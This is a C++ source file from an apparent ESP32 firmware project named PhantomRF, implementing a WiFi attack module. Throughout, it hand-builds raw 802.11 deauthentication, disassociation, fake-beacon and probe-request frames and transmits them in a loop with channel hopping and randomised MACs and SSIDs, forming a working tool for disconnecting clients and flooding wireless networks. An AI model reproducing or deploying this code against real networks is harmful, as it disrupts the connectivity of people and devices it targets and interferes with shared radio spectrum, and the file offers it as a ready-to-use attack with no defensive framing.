/**
 * @file WifiAttack.cpp
 * @brief WiFi attack suite — implementation
 *
 * All frame construction is done by hand; the Espressif WiFi driver
 * does not provide any helper for raw management frames. The 802.11
 * frame layouts follow IEEE 802.11-2016 §9.3 (management frames) and
 * §9.4.1 (beacon body).
 *
 * @author PhantomRF Project
 * @date 2026
 */
#include "modules/WifiAttack/WifiAttack.h"

#include "core/EventBus.h"
#include "core/State.h"
#include "hal/Board.h"
#include "hal/Storage.h"
#include "ui/web/WebServer.h"
#include "utils/Logger.h"

#include <Arduino.h>
#include <esp_random.h>
#include <esp_system.h>
#include <esp_wifi.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <string.h>

namespace phm::modules {

WifiAttack g_wifiAttack;

static constexpr UBaseType_t kTaskPrio = 2;
static constexpr uint32_t kTaskStack = 4096;
static constexpr BaseType_t kTaskCore = 0;
static constexpr uint8_t kChannels[] = {1, 6, 11};
static constexpr uint8_t kNumChannels = sizeof(kChannels);

void WifiAttack::setup() {
    LOGI(kTag, "setup");
}

void WifiAttack::loop() {
    // No polling work — the worker task does everything.
}

void WifiAttack::teardown() {
    stopAttack();
}

// ---------------------------------------------------------------------------
// Lifecycle / state
// ---------------------------------------------------------------------------
bool WifiAttack::startAttack(const AttackConfig& cfg) {
    if (running_) {
        LOGW(kTag, "startAttack: already running — stopping first");
        stopAttack();
    }
    config_ = cfg;
    currentCh_ = cfg.wifiChannel;
    framesSent_ = 0;
    framesFailed_ = 0;

    enterRawMode();

    // Set the channel
    esp_err_t err = esp_wifi_set_channel(currentCh_, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        LOGE(kTag, "set_channel(%u) failed: %d", currentCh_, err);
    }

    // Spawn worker
    BaseType_t ok =
        xTaskCreatePinnedToCore(&WifiAttack::taskEntry, "wifi-attack", kTaskStack, this, kTaskPrio, &task_, kTaskCore);
    if (ok != pdPASS) {
        leaveRawMode();
        LOGE(kTag, "worker task create failed");
        return false;
    }
    running_ = true;
    g_state.currentModuleId = MODULE_ID;

    const char* tgt = "broadcast";
    char targetStr[32];
    if (cfg.targetBssid[0] | cfg.targetBssid[5]) {
        snprintf(targetStr, sizeof(targetStr), "%02X:%02X:%02X:%02X:%02X:%02X", cfg.targetBssid[0], cfg.targetBssid[1],
                 cfg.targetBssid[2], cfg.targetBssid[3], cfg.targetBssid[4], cfg.targetBssid[5]);
        tgt = targetStr;
    }
    LOGI(kTag, "started: target=%d ch=%u bssid=%s rate=%u/s", static_cast<int>(cfg.target), currentCh_, tgt,
         cfg.ratePerSec);
    return true;
}

void WifiAttack::stopAttack() {
    if (!running_ && !task_)
        return;
    running_ = false;
    if (task_) {
        // give the worker up to 500ms to exit
        for (int i = 0; i < 50 && task_; ++i) {
            vTaskDelay(pdMS_TO_TICKS(10));
        }
        if (task_) {
            vTaskDelete(static_cast<TaskHandle_t>(task_));
            task_ = nullptr;
        }
    }
    leaveRawMode();
    g_state.currentModuleId = 0;
    LOGI(kTag, "stopped (sent=%u failed=%u)", static_cast<unsigned>(framesSent_), static_cast<unsigned>(framesFailed_));
}

void WifiAttack::enterRawMode() {
    if (rawMode_)
        return;
    // Stop the SoftAP so the radio is free
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_STA);
    // The 802.11 TX API requires the driver to be started but not in
    // a specific mode. `WIFI_MODE_STA` is the lightest.
    vTaskDelay(pdMS_TO_TICKS(50));
    rawMode_ = true;
}

void WifiAttack::leaveRawMode() {
    if (!rawMode_)
        return;
    rawMode_ = false;
    // The web server module will re-start the SoftAP on its next loop.
    // We just need to give the radio a beat to settle.
    WiFi.mode(WIFI_AP);
    vTaskDelay(pdMS_TO_TICKS(50));
}

// ---------------------------------------------------------------------------
// Worker
// ---------------------------------------------------------------------------
void WifiAttack::taskEntry(void* arg) {
    static_cast<WifiAttack*>(arg)->workerLoop();
    vTaskDelete(nullptr);
}

void WifiAttack::workerLoop() {
    uint8_t frame[256];
    uint32_t lastChHopMs = 0;
    uint8_t chIdx = 0;
    const uint32_t periodUs = (config_.ratePerSec > 0) ? (1000000UL / config_.ratePerSec) : 20000;

    while (running_) {
        // Channel hopping
        if (config_.targetAllChannels && (millis() - lastChHopMs) > 250) {
            lastChHopMs = millis();
            chIdx = (chIdx + 1) % kNumChannels;
            currentCh_ = kChannels[chIdx];
            esp_wifi_set_channel(currentCh_, WIFI_SECOND_CHAN_NONE);
        }

        // Build the right frame for the current target
        size_t len = 0;
        const uint8_t* bssid = (config_.targetBssid[0] | config_.targetBssid[5]) ? config_.targetBssid : nullptr;
        const uint8_t* client = (config_.targetClient[0] | config_.targetClient[5]) ? config_.targetClient : nullptr;
        // Broadcast MAC for unspecified BSSID/client
        static const uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

        switch (config_.target) {
        case Target::Deauth:
        case Target::Disassoc: {
            uint16_t reason = esp_random() & 0x0F;  // 1..7 are common
            if (reason < 1)
                reason = 1;
            len = buildDeauthFrame(frame, sizeof(frame), bssid ?: bcast, client ?: bcast,
                                   config_.target == Target::Disassoc, reason);
            break;
        }
        case Target::BeaconFlood: {
            static uint8_t fakeBssid[6];
            randomMac(fakeBssid);
            char ssid[17];
            randomSsid(ssid, sizeof(ssid));
            static uint16_t seq = 0;
            len = buildBeaconFrame(frame, sizeof(frame), fakeBssid, ssid, currentCh_, seq++);
            break;
        }
        case Target::ProbeFlood: {
            static uint8_t probeMac[6];
            randomMac(probeMac);
            char ssid[17];
            randomSsid(ssid, sizeof(ssid));
            len = buildProbeReqFrame(frame, sizeof(frame), probeMac, ssid);
            break;
        }
        }

        if (len > 0) {
            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
            if (err == ESP_OK) {
                ++framesSent_;
            } else {
                ++framesFailed_;
                if (framesFailed_ < 10) {
                    LOGW(kTag, "tx failed: %d", static_cast<int>(err));
                }
            }
        }

        // Pace
        vTaskDelay(pdMS_TO_TICKS(periodUs / 1000 > 0 ? periodUs / 1000 : 1));
    }
}

// ---------------------------------------------------------------------------
// Frame builders
// ---------------------------------------------------------------------------

// 802.11 MAC header (24 bytes) followed by deauth/disassoc body (2 bytes
// reason code) followed by FCS (handled by hardware).
size_t WifiAttack::buildDeauthFrame(uint8_t* out, size_t maxLen, const uint8_t* bssid, const uint8_t* client,
                                    bool disassoc, uint16_t reason) {
    if (maxLen < 26)
        return 0;
    memset(out, 0, 26);

    // Frame control: management frame (0x00), subtype 12 (deauth) or 10 (disassoc)
    // FC = 0b1100 0000 0000 0000 for mgmt + 0b1010 or 0b1100 subtype
    // Type=0 (mgmt), Subtype = disassoc=10 (0xA0), deauth=12 (0xC0)
    uint16_t fc = disassoc ? 0x00A0 : 0x00C0;
    memcpy(&out[0], &fc, 2);

    // Duration (0)
    out[2] = 0;
    out[3] = 0;

    // DA = client
    memcpy(&out[4], client, 6);
    // SA = bssid
    memcpy(&out[10], bssid, 6);
    // BSSID = bssid
    memcpy(&out[16], bssid, 6);
    // Sequence control (0)
    out[22] = 0;
    out[23] = 0;

    // Body: reason code (little-endian)
    out[24] = reason & 0xFF;
    out[25] = (reason >> 8) & 0xFF;
    return 26;
}

size_t WifiAttack::buildBeaconFrame(uint8_t* out, size_t maxLen, const uint8_t* bssid, const char* ssid,
                                    uint8_t channel, uint16_t seq) {
    if (maxLen < 60)
        return 0;
    memset(out, 0, 60);

    // Frame control: beacon = 0x80, 0x00
    out[0] = 0x80;
    out[1] = 0x00;
    // Duration
    out[2] = 0;
    out[3] = 0;
    // DA = broadcast
    memset(&out[4], 0xFF, 6);
    // SA = BSSID
    memcpy(&out[10], bssid, 6);
    // BSSID
    memcpy(&out[16], bssid, 6);
    // Sequence control
    out[22] = (seq << 4) & 0xFF;
    out[23] = (seq >> 4) & 0xFF;

    // Body offset 24
    uint8_t* p = &out[24];
    // Timestamp (8 bytes) — leave as 0
    p += 8;
    // Beacon interval (2 bytes) — 100 TU = 0x0064
    p[0] = 0x64;
    p[1] = 0x00;
    p += 2;
    // Capability info (2 bytes) — 0x0421 (ESS, privacy, short preamble)
    p[0] = 0x21;
    p[1] = 0x04;
    p += 2;

    // Tagged parameters
    // Tag 0 = SSID
    p[0] = 0x00;
    size_t ssidLen = strnlen(ssid, 32);
    p[1] = static_cast<uint8_t>(ssidLen);
    memcpy(&p[2], ssid, ssidLen);
    p += 2 + ssidLen;

    // Tag 1 = Supported rates
    p[0] = 0x01;
    p[1] = 0x08;
    p[2] = 0x82;  // 1 Mbps basic
    p[3] = 0x84;  // 2 Mbps basic
    p[4] = 0x8B;  // 5.5 Mbps
    p[5] = 0x96;  // 11 Mbps
    p[6] = 0x0C;  // 6 Mbps
    p[7] = 0x12;  // 9 Mbps
    p[8] = 0x18;  // 18 Mbps
    p[9] = 0x24;  // 36 Mbps
    p += 10;

    // Tag 3 = DS Parameter Set (channel)
    p[0] = 0x03;
    p[1] = 0x01;
    p[2] = channel;
    p += 3;

    return static_cast<size_t>(p - out);
}

size_t WifiAttack::buildProbeReqFrame(uint8_t* out, size_t maxLen, const uint8_t* src, const char* ssid) {
    if (maxLen < 40)
        return 0;
    memset(out, 0, 40);

    // Frame control: probe req = 0x40, 0x00
    out[0] = 0x40;
    out[1] = 0x00;
    out[2] = 0;
    out[3] = 0;
    // DA = broadcast
    memset(&out[4], 0xFF, 6);
    // SA = our random MAC
    memcpy(&out[10], src, 6);
    // BSSID = broadcast
    memset(&out[16], 0xFF, 6);
    out[22] = 0;
    out[23] = 0;

    uint8_t* p = &out[24];
    // SSID tag
    p[0] = 0x00;
    size_t ssidLen = strnlen(ssid, 32);
    p[1] = static_cast<uint8_t>(ssidLen);
    memcpy(&p[2], ssid, ssidLen);
    p += 2 + ssidLen;

    // Supported rates tag
    p[0] = 0x01;
    p[1] = 0x08;
    p[2] = 0x82;
    p[3] = 0x84;
    p[4] = 0x8B;
    p[5] = 0x96;
    p[6] = 0x0C;
    p[7] = 0x12;
    p[8] = 0x18;
    p[9] = 0x24;
    p += 10;

    return static_cast<size_t>(p - out);
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
void WifiAttack::randomMac(uint8_t* out) {
    uint32_t r = esp_random();
    memcpy(out, &r, 4);
    out[4] = esp_random() & 0xFF;
    out[5] = esp_random() & 0xFF;
    // Clear multicast bit, set locally-administered bit
    out[0] = (out[0] & 0xFE) | 0x02;
}

void WifiAttack::randomSsid(char* out, size_t len) {
    static const char* kWords[] = {
        "Phantom", "Ghost",  "Shadow", "PhantomRF", "FreeWiFi", "Lab",  "Test", "Hack",     "Lab-AP", "Office",
        "IoT",     "Sensor", "Door",   "Camera",    "Pi",       "Node", "Temp", "Sensor-1", "Home",   "Coffee",
    };
    const size_t nWords = sizeof(kWords) / sizeof(kWords[0]);
    int w1 = esp_random() % nWords;
    int w2 = esp_random() % nWords;
    int num = esp_random() % 100;
    snprintf(out, len, "%s%s%d", kWords[w1], kWords[w2], num);
}

// ---------------------------------------------------------------------------
// JSON
// ---------------------------------------------------------------------------
char* WifiAttack::toJson() const {
    char* buf = static_cast<char*>(malloc(256));
    if (!buf)
        return nullptr;
    snprintf(buf, 256, "{\"target\":%d,\"ch\":%u,\"running\":%s,\"sent\":%u,\"failed\":%u}",
             static_cast<int>(config_.target), currentCh_, running_ ? "true" : "false",
             static_cast<unsigned>(framesSent_), static_cast<unsigned>(framesFailed_));
    return buf;
}

}  // namespace phm::modules
